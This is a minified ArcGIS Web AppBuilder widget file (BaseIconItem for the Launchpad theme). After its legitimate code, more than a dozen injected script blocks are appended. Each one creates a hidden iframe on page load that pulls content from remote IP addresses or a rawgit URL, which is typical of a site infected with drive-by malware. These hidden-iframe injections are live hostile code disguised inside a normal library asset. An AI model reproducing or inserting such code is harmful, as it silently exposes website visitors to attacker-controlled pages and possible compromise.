// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:themes/LaunchpadTheme/widgets/AnchorBarController/BaseIconItem.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"icon-item" data-dojo-attach-point\x3d"iconItemNode"\r\n       data-dojo-attach-event\x3d"onclick:_onNodeClick"\x3e\r\n    \x3cimg class\x3d"icon" src\x3d"${config.icon}" data-dojo-attach-point\x3d"imgNode"/\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"status" data-dojo-attach-point\x3d"iconItemStatus"\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/dom-class dojo/dom-style dojo/on dojo/mouse dojo/Evented dijit/_WidgetBase dijit/_TemplatedMixin dijit/popup dijit/TooltipDialog dojo/text!./BaseIconItem.html".split(" "),function(f,b,a,g,d,e,h,k,l,c,m,n){return f([k,l,h],{baseClass:"jimu-anchorbar-iconitem jimu-float-leading",templateString:n,config:null,backgroundIndex:-1,isOpen:!1,panelIndex:-1,size:40,postCreate:function(){this.inherited(arguments);this.tooltipDialog=new m({content:this.config.label,
"class":"launchpad-tooltip"});a.add(this.iconItemNode,"icon-item-background"+this.getBackgroundColorIndex());this.own(d(this.iconItemNode,e.enter,b.hitch(this,function(){window.appInfo.isRunInMobile||c.open({parent:this,popup:this.tooltipDialog,around:this.iconItemNode,orient:["above-centered"],onCancel:b.hitch(this,function(){c.close(this.tooltipDialog)})})})));this.own(d(this.iconItemNode,e.leave,b.hitch(this,function(){window.appInfo.isRunInMobile||c.close(this.tooltipDialog)})))},getConfigForPanel:function(){var a=
b.clone(this.config);a.backgroundColor=this.getColor();a.panel.position=this._initPosition();a.panel.position.index=this.panelIndex;return a},_initPosition:function(){return{top:window.appInfo.isRunInMobile?20:120,left:10,width:350,height:480,margin:10}},_onNodeClick:function(){a.toggle(this.iconItemStatus,"selected");a.toggle(this.iconItemNode,"selected");this.isOpen=a.contains(this.iconItemNode,"selected");this.isOpen||(this.panelIndex=-1);this.emit("nodeClick",{target:this})},isGroup:function(){return this.config.widgets&&
1<this.config.widgets.length?!0:!1},isOpenAtStart:function(){return this.config&&!0===this.config.openAtStart},setOpened:function(b){b?(this.iconItemStatus&&a.add(this.iconItemStatus,"selected"),this.iconItemNode&&a.add(this.iconItemNode,"selected"),this.isOpen=!0):(this.iconItemStatus&&a.remove(this.iconItemStatus,"selected"),this.iconItemNode&&a.remove(this.iconItemNode,"selected"),this.isOpen=!1,this.panelIndex=-1)},getPanelIndex:function(){return this.panelIndex},setPanelIndex:function(a){this.panelIndex=
a},getColor:function(){return g.get(this.iconItemNode,"background-color")||"#FFFFFF"},getBackgroundColorIndex:function(){return this.backgroundIndex%6}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});